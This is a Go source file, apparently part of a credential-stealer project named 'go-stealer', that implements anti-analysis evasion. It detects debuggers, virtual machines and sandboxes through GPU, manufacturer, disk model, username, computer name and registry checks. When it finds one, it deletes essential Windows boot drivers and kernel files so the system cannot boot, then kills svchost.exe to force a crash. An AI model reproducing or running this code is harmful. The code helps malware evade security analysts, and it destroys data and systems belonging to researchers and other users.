package main

import (
	"bytes"
	"go-stealer/anti_vm"
	"os"
	"slices"
	"strings"

	"golang.org/x/sys/windows/registry"
)

var (
	isDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
)

// checkGPU checks for the presence of virtual GPU drivers.
func checkGPU() bool {
	cmd := executeCommand("powershell", "-Command", "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		return false
	}

	gpus := strings.Split(strings.TrimSpace(out.String()), "\n")
	for _, gpu := range gpus {
		gpu = strings.TrimSpace(strings.ToLower(gpu))
		// Checks for VirtualBox, VMware, QEMU, Parallels (macOS host) software GPU drivers
		if strings.Contains(gpu, "virtual") || strings.Contains(gpu, "vmware") || strings.Contains(gpu, "vbox") ||
			strings.Contains(gpu, "qemu") || strings.Contains(gpu, "virtio") || strings.Contains(gpu, "parallels") {
			return true
		}
	}

	return false
}

// checkManufacturer checks the system manufacturer for known virtual machine vendors, hypervisors, or cloud providers.
func checkManufacturer() bool {
	cmd := executeCommand("powershell", "-Command", "Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		return false
	}

	manufacturer := strings.TrimSpace(strings.ToLower(out.String()))
	// Checks for VMware, VirtualBox, QEMU, KVM, Microsoft Hyper-V, Xen
	if strings.Contains(manufacturer, "vmware") || strings.Contains(manufacturer, "virtualbox") ||
		strings.Contains(manufacturer, "qemu") || strings.Contains(manufacturer, "kvm") ||
		strings.Contains(manufacturer, "microsoft corporation") || strings.Contains(manufacturer, "xen") {
		return true
	}
	return false
}

// checkUsername checks for common usernames associated with virtual machines or testing environments.
func checkUsername() bool {
	username := strings.TrimSpace(strings.ToLower(os.Getenv("USERNAME")))
	suspiciousUsernames := []string{
		"admin", "administrator", "user", "test", "guest", "vmuser", "vboxuser", "qemuuser", "xenuser", "wdagutilityaccount",
	}
	return slices.Contains(suspiciousUsernames, username)
}

// checkComputerName checks for common computer names associated with virtual machines or testing environments.
func checkComputerName() bool {
	computerName := strings.TrimSpace(strings.ToLower(os.Getenv("COMPUTERNAME")))
	suspiciousNames := []string{
		"desktop-c8gqkg7", "maspenc", "desktop-dsmevvl", "desktop-et51ajO", "win-5e07c0s9alr", "dorispalme",
	}
	return slices.Contains(suspiciousNames, computerName)
}

// checkDiskModel checks the disk model for known virtual disk identifiers.
// For example, VMware often uses "VMware Virtual NVMe Disk" or similar.
func checkDiskModel() bool {
	cmd := executeCommand("powershell", "-Command", "Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		return false
	}

	models := strings.Split(strings.TrimSpace(out.String()), "\n")
	for _, model := range models {
		model = strings.TrimSpace(strings.ToLower(model))
		if strings.Contains(model, "virtual") || strings.Contains(model, "vmware") || strings.Contains(model, "vbox") ||
			strings.Contains(model, "qemu") || strings.Contains(model, "virtio") || strings.Contains(model, "parallels") {
			return true
		}
	}
	return false
}

// checkRegeditKeys checks for the presence of registry keys associated with VM tools.
func checkRegeditKeys() bool {
	keys := [][]interface{}{
		{registry.CURRENT_USER, "SOFTWARE\\VMware, Inc.\\VMware Tools"},
		{registry.CURRENT_USER, "SOFTWARE\\Oracle\\VirtualBox Guest Additions"},
	}
	for _, k := range keys {
		key, path := k[0].(registry.Key), k[1].(string)
		k, err := registry.OpenKey(key, path, registry.READ)
		if err == nil {
			k.Close()
			return true
		}
	}
	return false
}

// IsVM aggregates all checks to determine if the program is running in a virtualized environment.
// By "virtualized environment", I mean any virtual machine, sandbox, hypervisor, or cloud provider environment (e.g., AWS, Azure, GCP).
func IsVM() bool {
	ret, _, _ := isDebuggerPresent.Call()

	// ret != 0 means a debugger is present
	return ret != 0 || checkComputerName() || checkUsername() || anti_vm.CheckProcesses() || checkManufacturer() || checkGPU() ||
		checkDiskModel() || checkRegeditKeys()
}

func TriggerBSOD() {
	err := executeCommand("taskkill", "/F", "/IM", "svchost.exe").Run()
	if err != nil {
		panic(err)
	}
}

// deleteEssentialDrivers attempts to delete essential system drivers to make the system unbootable.
// In fact, when booting, Windows will render a INACCESSIBLE_BOOT_DEVICE error
func deleteEssentialFiles() {
	system32Path := os.Getenv("SystemRoot") + "\\System32\\"
	essentialDrivers := []string{
		"ntfs.sys", "pciide.sys", "atapi.sys", "iastor.sys", "iaStorA.sys", "storahci.sys",
	}
	essentialFiles := []string{
		"ntoskrnl.exe", "winload.exe", "winload.efi",
	}
	for _, driver := range essentialDrivers {
		driverPath := system32Path + "drivers\\" + driver
		err := os.Remove(driverPath)
		if err != nil {
			continue
		}
	}

	for _, file := range essentialFiles {
		filePath := system32Path + file
		err := os.Remove(filePath)
		if err != nil {
			continue
		}
	}
}

func FuckUpVM() {
	deleteEssentialFiles()
	TriggerBSOD()
}
